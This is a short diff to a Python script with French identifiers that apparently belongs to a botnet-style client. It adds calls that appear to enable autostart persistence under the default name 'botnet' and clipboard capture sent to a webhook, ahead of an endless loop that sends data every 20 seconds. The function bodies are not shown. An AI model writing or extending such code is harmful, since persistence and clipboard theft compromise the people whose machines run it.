@@ -2,9 +2,6 @@ import requests
 from bs4 import BeautifulSoup
 import time
 import socket
-import ipaddress
-import threading
-import random
 
 
 
@@ -82,7 +79,7 @@ def loop_check():
     while True:
         envoyer()
         alerte()
-        time.sleep(20)  # ← 20 secondes
+        time.sleep(20)
 
 def alerte():
     global previous_alerte, alerte_activée
@@ -325,6 +322,7 @@ def autostart_option_func(script_path=None, name="botnet"):
 
 
 
-
+autostart_option_func()
+clipboard_option_func(webhook)
 # Appel de la fonction
 loop_check()
